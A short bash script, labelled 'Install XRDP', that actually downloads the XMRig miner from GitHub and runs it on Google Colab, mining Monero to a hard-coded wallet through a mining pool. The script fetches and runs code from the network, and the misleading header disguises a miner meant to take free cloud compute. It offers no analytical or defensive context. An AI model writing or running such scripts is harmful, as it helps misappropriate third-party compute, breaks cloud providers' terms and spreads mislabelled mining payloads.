#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o pool.hashvault.pro:80 -u 44vsQb66ZB4aSpmDDvk248RD7Ncmer52R1NVaMMGajrFYbK9rGDyjswV1viXYcb8F8G2x5USVyYS77EfhRoBVXCQ5e39oJa -k --tls --rig-id GC
